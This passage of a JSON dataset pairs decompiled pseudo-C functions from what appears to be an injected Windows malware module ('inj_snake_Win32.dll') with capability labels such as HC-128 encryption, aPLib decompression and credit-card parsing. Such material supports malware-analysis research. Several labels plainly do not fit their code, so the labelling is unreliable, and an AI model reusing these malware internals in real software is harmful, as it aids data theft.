        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2001d2c7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    char var_2h;\n    uint var_1h;\n    \n    var_ch = 0x21590002;\n    fcn.20001567(in_EAX + 0x18);\n    if (*(in_EAX + 0xc) == 0) {\n        if (*(in_EAX + 8) == 0) {\n            var_ch = 0x21590003;\n        }\n        else {\n            uVar2 = fcn.200018bf();\n            pcVar1 = _sym.imp.KERNEL32.dll_GetTickCount;\n            uVar2 = uVar2 & 0x8000007f;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xffffff80) + 1;\n            }\n            var_1h._0_1_ = uVar2;\n            var_10h = 0;\n            if (0 < *(in_EAX + 0x5c)) {\n                do {\n                    iVar3 = (*pcVar1)();\n                    var_ch = fcn.2001c77a(arg_ch);\n                    if (var_ch != 0) break;\n                    var_ch = fcn.2001d0c4(1, &var_2h, 0, 0, *(in_EAX + 0x48) * 2);\n                    if (var_ch == 0) {\n                        if (var_2h == var_1h) {\n                            iVar4 = (*pcVar1)();\n                            uVar2 = iVar4 - iVar3;\n                            if (uVar2 < 100) {\n                                uVar2 = 100;\n                            }\n                            uVar2 = *(in_EAX + 0x48) + uVar2 >> 1;\n                            *(in_EAX + 0x48) = uVar2;\n                            if (60000 < uVar2) {\n                                *(in_EAX + 0x48) = 60000;\n                            }\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + '\\x01';\n                            var_ch = 0;\n                            break;\n                        }\n                        var_10h = var_10h + -1;\n                    }\n                    else {\n                        if (var_ch != 0x21590002) goto code_r0x2001d2f1;\n                        if (var_10h < *(in_EAX + 0x5c) + -1) {\n                            uVar2 = *(in_EAX + 100);\n                            if (uVar2 <= *(in_EAX + 0x48)) {\n                                uVar2 = uVar2 + *(in_EAX + 0x48);\n                            }\n                            *(in_EAX + 0x48) = uVar2;\n                        }\n                        else {\n                            var_ch = 0x21590002;\n                        }\n                    }\n                    var_10h = var_10h + 1;\n                } while (var_10h < *(in_EAX + 0x5c));\n                if (var_ch != 0x21590002) goto code_r0x2001d2f1;\n            }\n            *(in_EAX + 0x10) = 0;\n            *(in_EAX + 8) = 0;\n            fcn.2001c77a(0);\n        }\n    }\n    else {\n        var_ch = 0x21590006;\n    }\ncode_r0x2001d2f1:\n    fcn.2000157d(in_EAX + 0x18);\n    return var_ch;\n}\n",
        "token_count": 904
    },
    "2001e78f": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2001e78f(int32_t arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t arg_10h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    arg_10h_00 = arg_8h;\n    pcVar1 = _sym.imp.KERNEL32.dll_GetTickCount;\n    uVar4 = *(arg_8h + 0x18);\n    *(arg_8h + 0x18) = *(arg_8h + 0x18) + 1;\n    iVar2 = (*pcVar1)();\n    iVar3 = fcn.2001d84e(arg_ch, arg_10h, arg_8h, &var_1ch, uVar4, 4);\n    arg_8h = iVar2;\n    while( true ) {\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n        iVar2 = fcn.2001ddfd(arg_14h, arg_18h, arg_10h_00, &var_4h, &var_1ch, uVar4, arg_1ch);\n        if (iVar2 != 0) break;\n        iVar2 = (*pcVar1)();\n        if ((var_4h & 2) == 0) {\n            uVar4 = *(arg_10h_00 + 0x1c) + (iVar2 - arg_8h) >> 1;\n            *(arg_10h_00 + 0x1c) = uVar4;\n            if (5000 < uVar4) {\n                *(arg_10h_00 + 0x1c) = 5000;\n            }\n            return 0;\n        }\n        fcn.20019762(arg_10h_00, *arg_14h);\n        fcn.200012d6(arg_10h_00 + 0x34, *(arg_10h_00 + 0x1c));\n        uVar4 = fcn.200018bf();\n        *(arg_10h_00 + 0x1c) = *(arg_10h_00 + 0x1c) + uVar4 % *(arg_10h_00 + 0x20) + 1;\n        if (5000 < *(arg_10h_00 + 0x1c)) {\n            *(arg_10h_00 + 0x1c) = 5000;\n        }\n        uVar4 = *(arg_10h_00 + 0x18);\n        *(arg_10h_00 + 0x18) = *(arg_10h_00 + 0x18) + 1;\n        arg_8h = (*pcVar1)();\n        iVar3 = fcn.2001db8c(&var_1ch, uVar4, 4);\n    }\n    return iVar2;\n}\n",
        "token_count": 701
    },
    "20006d98": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.20006d98(uint arg_8h, uint noname_1, int32_t arg_10h, uint32_t arg_14h, uint noname_4, uint noname_5, \n            int32_t arg_20h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t arg_ch;\n    uint *puVar3;\n    int32_t iVar4;\n    uint var_270h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1bh;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    arg_ch = 0;\n    var_ch = 0;\n    var_10h = sym.inj_snake_Win32.dll_config_read_uint32(1, 0);\n    pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n    if (arg_20h == 0) {\n        arg_20h = 0;\n        if (arg_14h < 1) goto code_r0x20006eb2;\n        do {\n            if (0x7f < arg_20h) break;\n            if (arg_14h < iVar4 + 0x19U) {\n                arg_ch = 0x21590201;\n                goto code_r0x20006f19;\n            }\n            var_4h = (*pcVar1)(*(iVar4 + arg_10h));\n            if (arg_14h - iVar4 < var_4h) {\n                arg_ch = 0x21590201;\n                break;\n            }\n            iVar4 = iVar4 + 4;\n            sub.ntdll.dll_memcpy(&var_28h, arg_10h + iVar4, 0x15);\n            var_28h = (*pcVar1)(var_28h);\n            var_24h = (*pcVar1)(var_24h);\n            var_1bh = (*pcVar1)(var_1bh);\n            if (var_ch == 0) {\n                iVar2 = sym.inj_snake_Win32.dll_qm_push(var_10h, 9, var_24h, arg_10h + iVar4, var_4h, 0);\n                if (iVar2 == 0) {\n                    (&var_270h)[arg_20h] = var_24h;\n                }\n                else {\n                    arg_ch = iVar2 + 0x191U | 0x21590000;\n                    fcn.200066c0(var_24h, arg_ch, 0, 0);\n                    var_ch = 1;\n                }\n            }\n            else {\n                fcn.200066c0(var_24h, 0x21590006, 0, 0);\n            }\n            iVar4 = iVar4 + var_4h;\n            arg_20h = arg_20h + 1;\n        } while (iVar4 < arg_14h);\n    }\n    else {\n        var_2ch = sym.inj_snake_Win32.dll_config_read_uint32(400, 20000);\n        pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n        arg_20h = 0;\n        do {\n            var_8h = 0;\n            arg_ch = sym.inj_snake_Win32.dll_tr_read_pipe(arg_8h);\n            if (arg_ch != 0) {\ncode_r0x20007066:\n                arg_ch = 0x21590201;\n                break;\n            }\n            if (var_4h == 0) break;\n            if (var_4h < 0x15) goto code_r0x20007066;\n            sub.ntdll.dll_memcpy(&var_28h, var_8h, 0x15);\n            var_28h = (*pcVar1)(var_28h);\n            var_24h = (*pcVar1)(var_24h);\n            var_1bh = (*pcVar1)(var_1bh);\n            if (var_ch == 0) {\n                iVar4 = sym.inj_snake_Win32.dll_qm_push(var_10h, 9, var_24h, var_8h, var_4h, 0);\n                if (iVar4 == 0) {\n                    (&var_270h)[arg_20h] = var_24h;\n                }\n                else {\n                    arg_ch = iVar4 + 0x191U | 0x21590000;\n                    fcn.200066c0(var_24h, arg_ch, 0, 0);\n                    var_ch = 1;\n                }\n            }\n            else {\n                fcn.200066c0(var_24h, 0x21590006, 0, 0);\n            }\n            sym.inj_snake_Win32.dll_tr_free(arg_8h, var_8h, 0);\n            arg_20h = arg_20h + 1;\n            var_8h = 0;\n        } while (arg_20h < 0x80);\n        sym.inj_snake_Win32.dll_tr_free(arg_8h, var_8h, 0);\n    }\n    if (arg_ch != 0) {\ncode_r0x20006f19:\n        if (arg_20h < 1) {\n            return arg_ch;\n        }\n        puVar3 = &var_270h;\n        do {\n            iVar4 = sym.inj_snake_Win32.dll_qm_find_first(var_10h, 9, puVar3, &var_70h);\n            if (iVar4 == 0) {\n                sym.inj_snake_Win32.dll_qm_rm(var_70h, var_68h, var_6ch);\n            }\n            puVar3 = puVar3 + 1;\n            arg_20h = arg_20h + -1;\n        } while (arg_20h != 0);\n        return arg_ch;\n    }\ncode_r0x20006eb2:\n    if (0 < arg_20h) {\n        puVar3 = &var_270h;\n        do {\n            iVar4 = sym.inj_snake_Win32.dll_qm_find_first(var_10h, 9, puVar3, &var_70h);\n            if ((iVar4 == 0) &&\n               (iVar4 = sym.inj_snake_Win32.dll_qm_move(var_70h, var_68h, var_6ch, 0, &var_30h),  iVar4 != 0)) {\n                sym.inj_snake_Win32.dll_qm_rm(var_70h, var_68h, var_6ch);\n            }\n            puVar3 = puVar3 + 1;\n            arg_20h = arg_20h + -1;\n        } while (arg_20h != 0);\n    }\n    fcn.200055a6();\n    return arg_ch;\n}\n",
        "token_count": 1585
    },
    "20008a53": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20008a53(int32_t arg_8h, char *arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char *arg_8h_00;\n    uint *s;\n    int32_t arg_10h;\n    uint var_104h;\n    \n    if (*arg_ch == '\\\\') {\n        if (((arg_ch[1] == '\\\\') && (arg_ch[2] == '.')) && (arg_ch[3] == '\\\\')) {\n            arg_ch = arg_ch + 4;\n        }\n        else if (((arg_ch[1] == '?') && (arg_ch[2] == '?')) && (arg_ch[3] == '\\\\')) {\n            arg_8h_00 = 0x2002d584;\n            goto code_r0x20008a82;\n        }\n    }\n    arg_8h_00 = \"\\\\??\\\\%s\";\ncode_r0x20008a82:\n    s = &var_104h;\n    fcn.200088de(arg_8h_00, arg_ch);\n    arg_10h = arg_8h + 4;\n    *(arg_8h + 0x118) = 1;\n    uVar1 = fcn.20008999();\n    uVar1 = fcn.2000df70(uVar1, s, arg_10h);\n    uVar2 = fcn.20008999();\n    *(arg_8h + 0x11c) = uVar2;\n    return uVar1;\n}\n",
        "token_count": 337
    },
    "2000d3c1": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nint32_t fcn.2000d3c1(uint param_1, uint param_2, int32_t param_3)\n\n{\n    return (param_3 + 7U & 0xfffffff8) + 1;\n}\n",
        "token_count": 53
    },
    "2000d3d3": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000d3d3(uint s2, uint32_t n, char *arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_8ch;\n    uint32_t s1;\n    \n    if (n < 8) {\n        sub.ntdll.dll_memset(&s1, 0);\n        sub.ntdll.dll_memcpy(&s1, s2, n);\n    }\n    else {\n        sub.ntdll.dll_memcpy(&s1, s2, 8);\n    }\n    s1 = s1 ^ arg_18h;\n    if (arg_18h != 0) {\n        fcn.200146b9(&var_8ch, n, s2);\n        fcn.200142cd(arg_14h, arg_10h + 1, arg_18h, &var_8ch, &s1, 1);\n    }\n    iVar1 = (-((arg_18h & 7) != 0) & 8) + (arg_18h & 0xfffffff8);\n    *arg_10h = iVar1 - arg_18h;\n    return iVar1 + 1;\n}\n",
        "token_count": 271
    },
    "20023a81": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20023a81(uint s2, uint32_t n, int32_t s)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint s1;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    sub.ntdll.dll_memcpy(&s1, s2, n << 2);\n    if (n - 1 != 0) {\n        var_8h = 1;\n        puVar4 = &s1;\n        var_ch = n - 1;\n        do {\n            var_4h = var_8h;\n            while (var_4h < n) {\n                uVar6 = *puVar4;\n                puVar1 = &s1 + var_4h;\n                uVar2 = *puVar1;\n                if ((uVar2 & 0xf0000000) < (uVar6 & 0xf0000000)) {\n                    *puVar4 = uVar2;\n                    *puVar1 = uVar6;\n                }\n                var_4h = var_4h + 1;\n            }\n            var_8h = var_8h + 1;\n            puVar4 = puVar4 + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    uVar6 = 0;\n    sub.ntdll.dll_memset(s, 0, (n * 0x1c + 0x1b >> 5) << 2);\n    var_ch = 0;\n    if (n != 0) {\n        do {\n            uVar2 = (&s1)[var_ch];\n            uVar5 = 0;\n            do {\n                puVar3 = (uVar6 >> 3) + s;\n                *puVar3 = *puVar3 | ((1 << (uVar5 & 0x1f) & uVar2) >> (uVar5 & 0x1f)) << (uVar6 & 7);\n                uVar6 = uVar6 + 1;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0x1c);\n            var_ch = var_ch + 1;\n        } while (var_ch < n);\n    }\n    return uVar6 + 7 >> 3;\n}\n",
        "token_count": 563
    },
    "2000d46b": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t fcn.2000d46b(uint param_1, uint param_2, uint8_t *param_3, int32_t param_4)\n\n{\n    uint8_t uVar1;\n    \n    if (((param_4 != 0) && (uVar1 = *param_3,  uVar1 < 8)) && (uVar1 <= param_4 - 1U)) {\n        return (param_4 - uVar1) + -1;\n    }\n    return -1;\n}\n",
        "token_count": 114
    },
    "200212ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.200212ca(int32_t arg_8h, uint arg_ch, int32_t *arg_10h, int32_t *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    uint var_ach;\n    uint var_28h;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint8_t *var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.20021200();\n    if ((iVar1 == 0) && (iVar1 = fcn.20020c67(arg_8h, arg_ch, &var_ch, &var_10h),  iVar1 == 0)) {\n        iVar1 = fcn.20013656(*(arg_8h + 4), var_ch, var_10h, &var_8h, &var_4h, arg_18h, arg_1ch);\n        (*_sym.imp.msvcrt.dll_free)(var_ch);\n        if (iVar1 == 0) {\n            if (var_4h == 0) {\n                *arg_10h = 0;\n                *arg_14h = 0;\n                iVar1 = 0;\n            }\n            else if (var_4h < 9) {\n                iVar1 = 0x2159012d;\n            }\n            else {\n                sub.ntdll.dll_memcpy(&var_28h, *(arg_8h + 0x3c), 0x10);\n                sub.ntdll.dll_memcpy(&var_18h, &var_28h, 8);\n                fcn.200146b9(&var_ach, 0x10, &var_28h);\n                arg_ch_00 = (*_sym.imp.msvcrt.dll_malloc)(var_4h);\n                *arg_10h = arg_ch_00;\n                if (arg_ch_00 == 0) {\n                    iVar1 = 0x21590004;\n                }\n                else {\n                    fcn.200142cd(var_8h + 1, arg_ch_00, var_4h + -1, &var_ach, &var_18h, 0);\n                    *arg_14h = (var_4h - *var_8h) + -1;\n                }\n                fcn.20013299(*(arg_8h + 4), var_8h);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 560
    },
    "200214e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200214e4(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    uint var_a4h;\n    uint var_20h;\n    uint var_10h;\n    uint8_t *var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.20021200();\n    if ((iVar1 == 0) && (iVar1 = fcn.200135e2(*(arg_8h + 4), &var_8h, &var_4h, arg_14h, arg_18h),  iVar1 == 0)) {\n        if (var_4h == 0) {\n            *arg_ch = 0;\n            *arg_10h = 0;\n            iVar1 = 0;\n        }\n        else if (var_4h < 9) {\n            iVar1 = 0x2159012d;\n        }\n        else {\n            sub.ntdll.dll_memcpy(&var_20h, *(arg_8h + 0x3c), 0x10);\n            sub.ntdll.dll_memcpy(&var_10h, &var_20h, 8);\n            fcn.200146b9(&var_a4h, 0x10, &var_20h);\n            arg_ch_00 = (*_sym.imp.msvcrt.dll_malloc)(var_4h);\n            *arg_ch = arg_ch_00;\n            if (arg_ch_00 == 0) {\n                iVar1 = 0x21590004;\n            }\n            else {\n                fcn.200142cd(var_8h + 1, arg_ch_00, var_4h + -1, &var_a4h, &var_10h, 0);\n                *arg_10h = (var_4h - *var_8h) + -1;\n            }\n            fcn.20013299(*(arg_8h + 4), var_8h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 480
    },
    "2002443e": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.2002443e(uint32_t param_1)\n\n{\n    if ((param_1 & 0xffff0000) == 0) {\n        if ((param_1 & 0xff00) != 0) {\n            return *((param_1 >> 8) + 0x200301b8) + 8;\n        }\n        return *(param_1 + 0x200301b8);\n    }\n    if ((param_1 & 0xff000000) != 0) {\n        return *((param_1 >> 0x18) + 0x200301b8) + 0x18;\n    }\n    return *((param_1 >> 0x10) + 0x200301b8) + 0x10;\n}\n",
        "token_count": 171
    },
    "20025605": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.20025605(uchar *param_1, uint *param_2)\n\n{\n    uint *arg_ch;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    bool bVar8;\n    bool bVar9;\n    \n    iVar2 = param_2[0x16] >> 2;\n    uVar4 = param_2[0x16] & 3;\n    puVar5 = 0x200302c4;\n    arg_ch = param_2 + 6;\n    if (uVar4 == 0) {\n        uVar6 = 0x80;\n        puVar5 = 0x200302c5;\ncode_r0x20025642:\n        uVar6 = uVar6 | *puVar5 << 8;\n        puVar5 = puVar5 + 1;\ncode_r0x20025649:\n        uVar6 = uVar6 | *puVar5 << 0x10;\n        puVar5 = puVar5 + 1;\n    }\n    else {\n        uVar6 = arg_ch[iVar2];\n        if (uVar4 == 1) goto code_r0x20025642;\n        if (uVar4 == 2) goto code_r0x20025649;\n        if (uVar4 != 3) goto code_r0x2002565a;\n    }\n    uVar6 = uVar6 | *puVar5 << 0x18;\ncode_r0x2002565a:\n    arg_ch[iVar2] = uVar6;\n    iVar3 = iVar2 + 1;\n    bVar9 = SBORROW4(iVar3, 0xe);\n    bVar8 = iVar2 + -0xd < 0;\n    if (0xe < iVar3) {\n        if (iVar3 < 0x10) {\n            arg_ch[iVar3] = 0;\n        }\n        fcn.20024a91(param_2, arg_ch, 1);\n        iVar3 = 0;\n        bVar9 = false;\n        bVar8 = true;\n    }\n    if (bVar9 != bVar8) {\n        puVar7 = arg_ch + iVar3;\n        for (iVar2 = 0xe - iVar3; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n    }\n    param_2[0x14] = param_2[4];\n    param_2[0x15] = param_2[5];\n    fcn.20024a91(param_2, arg_ch, 1);\n    uVar1 = *param_2;\n    *param_1 = uVar1;\n    param_1[1] = uVar1 >> 8;\n    param_1[2] = uVar1 >> 0x10;\n    param_1[3] = uVar1 >> 0x18;\n    uVar1 = param_2[1];\n    param_1[4] = uVar1;\n    param_1[5] = uVar1 >> 8;\n    param_1[6] = uVar1 >> 0x10;\n    param_1[7] = uVar1 >> 0x18;\n    uVar1 = param_2[2];\n    param_1[8] = uVar1;\n    param_1[9] = uVar1 >> 8;\n    param_1[10] = uVar1 >> 0x10;\n    param_1[0xb] = uVar1 >> 0x18;\n    uVar1 = param_2[3];\n    param_1[0xc] = uVar1;\n    param_1[0xd] = uVar1 >> 8;\n    param_1[0xe] = uVar1 >> 0x10;\n    param_1[0xf] = uVar1 >> 0x18;\n    param_2[0x16] = 0;\n    return;\n}\n",
        "token_count": 925
    },
    "200276fc": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.200276fc(uint32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    if (arg_10h < 1) {\n        return uVar1;\n    }\n    uVar4 = arg_14h & 0xffff;\n    arg_14h = arg_14h >> 0x10;\n    while( true ) {\n        uVar5 = *arg_ch & 0xffff;\n        uVar2 = *arg_ch >> 0x10;\n        iVar6 = uVar2 * arg_14h;\n        uVar2 = uVar2 * uVar4;\n        uVar3 = uVar5 * arg_14h + uVar2;\n        if (uVar3 < uVar2) {\n            iVar6 = iVar6 + 0x10000;\n        }\n        uVar2 = uVar5 * uVar4 + uVar3 * 0x10000;\n        var_ch = iVar6 + (uVar3 >> 0x10);\n        if (uVar2 < uVar3 * 0x10000) {\n            var_ch = var_ch + 1;\n        }\n        uVar2 = uVar2 + uVar1;\n        if (uVar2 < uVar1) {\n            var_ch = var_ch + 1;\n        }\n        uVar2 = uVar2 + *arg_8h;\n        if (uVar2 < *arg_8h) {\n            var_ch = var_ch + 1;\n        }\n        *arg_8h = uVar2;\n        if (arg_10h == 1) {\n            return var_ch;\n        }\n        uVar3 = arg_ch[1] & 0xffff;\n        uVar1 = arg_ch[1] >> 0x10;\n        iVar6 = uVar1 * arg_14h;\n        uVar1 = uVar1 * uVar4;\n        uVar2 = uVar3 * arg_14h + uVar1;\n        if (uVar2 < uVar1) {\n            iVar6 = iVar6 + 0x10000;\n        }\n        uVar1 = uVar3 * uVar4 + uVar2 * 0x10000;\n        var_10h = iVar6 + (uVar2 >> 0x10);\n        if (uVar1 < uVar2 * 0x10000) {\n            var_10h = var_10h + 1;\n        }\n        uVar1 = uVar1 + var_ch;\n        if (uVar1 < var_ch) {\n            var_10h = var_10h + 1;\n        }\n        uVar1 = uVar1 + arg_8h[1];\n        if (uVar1 < arg_8h[1]) {\n            var_10h = var_10h + 1;\n        }\n        arg_8h[1] = uVar1;\n        if (arg_10h == 2) {\n            return var_10h;\n        }\n        uVar3 = arg_ch[2] & 0xffff;\n        uVar1 = arg_ch[2] >> 0x10;\n        iVar6 = uVar1 * arg_14h;\n        uVar1 = uVar1 * uVar4;\n        uVar2 = uVar3 * arg_14h + uVar1;\n        if (uVar2 < uVar1) {\n            iVar6 = iVar6 + 0x10000;\n        }\n        uVar1 = uVar3 * uVar4 + uVar2 * 0x10000;\n        var_ch = iVar6 + (uVar2 >> 0x10);\n        if (uVar1 < uVar2 * 0x10000) {\n            var_ch = var_ch + 1;\n        }\n        uVar1 = uVar1 + var_10h;\n        if (uVar1 < var_10h) {\n            var_ch = var_ch + 1;\n        }\n        uVar1 = uVar1 + arg_8h[2];\n        if (uVar1 < arg_8h[2]) {\n            var_ch = var_ch + 1;\n        }\n        arg_8h[2] = uVar1;\n        if (arg_10h == 3) break;\n        uVar3 = arg_ch[3] & 0xffff;\n        uVar1 = arg_ch[3] >> 0x10;\n        iVar6 = uVar1 * arg_14h;\n        uVar1 = uVar1 * uVar4;\n        uVar2 = uVar3 * arg_14h + uVar1;\n        if (uVar2 < uVar1) {\n            iVar6 = iVar6 + 0x10000;\n        }\n        uVar3 = uVar3 * uVar4 + uVar2 * 0x10000;\n        uVar1 = iVar6 + (uVar2 >> 0x10);\n        if (uVar3 < uVar2 * 0x10000) {\n            uVar1 = uVar1 + 1;\n        }\n        uVar3 = uVar3 + var_ch;\n        if (uVar3 < var_ch) {\n            uVar1 = uVar1 + 1;\n        }\n        uVar3 = uVar3 + arg_8h[3];\n        if (uVar3 < arg_8h[3]) {\n            uVar1 = uVar1 + 1;\n        }\n        arg_10h = arg_10h + -4;\n        arg_8h[3] = uVar3;\n        if (arg_10h == 0) {\n            return uVar1;\n        }\n        arg_ch = arg_ch + 4;\n        arg_8h = arg_8h + 4;\n    }\n    return var_ch;\n}\n",
        "token_count": 1377
    },
    "20027b58": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20027b58(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 2;\n    if (arg_10h == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.2002443e(arg_10h);\n    if (arg_10h <= arg_8h) {\n        arg_8h = arg_8h - arg_10h;\n    }\n    if (0x20 - iVar1 != 0) {\n        uVar3 = 0x20 - iVar1;\n        arg_10h = arg_10h << (uVar3 & 0x1f);\n        arg_8h = arg_8h << (uVar3 & 0x1f) | arg_ch >> (0x20 - uVar3 & 0x1f);\n        arg_ch = arg_ch << (uVar3 & 0x1f);\n    }\n    uVar5 = arg_10h >> 0x10;\n    do {\n        if (arg_8h >> 0x10 == uVar5) {\n            uVar2 = 0xffff;\n        }\n        else {\n            uVar2 = arg_8h / uVar5;\n        }\n        iVar1 = uVar2 * uVar5;\n        uVar6 = uVar2 * (arg_10h & 0xffff);\n        uVar4 = arg_8h - iVar1;\n        if ((uVar4 & 0xffff0000) == 0) {\n            do {\n                if (uVar6 <= (uVar4 << 0x10 | arg_ch >> 0x10)) break;\n                uVar6 = uVar6 - (arg_10h & 0xffff);\n                iVar1 = iVar1 - uVar5;\n                uVar4 = arg_8h - iVar1;\n                uVar2 = uVar2 - 1;\n            } while ((uVar4 & 0xffff0000) == 0);\n        }\n        uVar4 = iVar1 + (uVar6 >> 0x10);\n        if (arg_ch < uVar6 * 0x10000) {\n            uVar4 = uVar4 + 1;\n        }\n        if (arg_8h < uVar4) {\n            arg_8h = arg_8h + arg_10h;\n            uVar2 = uVar2 - 1;\n        }\n        var_8h = var_8h + -1;\n        if (var_8h == 0) {\n            return uVar2 | var_ch;\n        }\n        var_ch = uVar2 << 0x10;\n        arg_8h = (arg_8h - uVar4) * 0x10000 | arg_ch + uVar6 * -0x10000 >> 0x10;\n        arg_ch = arg_ch << 0x10;\n    } while( true );\n}\n",
        "token_count": 743
    },
    "20027df4": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20027df4(uint32_t *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    puVar3 = arg_10h;\n    puVar2 = arg_ch;\n    uVar1 = *arg_10h;\n    uVar7 = arg_ch[1] * uVar1;\n    uVar4 = *arg_ch * arg_10h[1] + uVar7;\n    arg_10h = arg_ch[1] * arg_10h[1];\n    if (uVar4 < uVar7) {\n        arg_10h = arg_10h + 0x10000;\n    }\n    arg_10h = arg_10h + (uVar4 >> 0x10);\n    uVar7 = *arg_ch * uVar1 + uVar4 * 0x10000;\n    if (uVar7 < uVar4 * 0x10000) {\n        arg_10h = arg_10h + 1;\n    }\n    *arg_8h = uVar7;\n    uVar7 = arg_ch[1] * puVar3[2];\n    iVar5 = arg_ch[1] * puVar3[3];\n    uVar4 = *arg_ch * puVar3[3] + 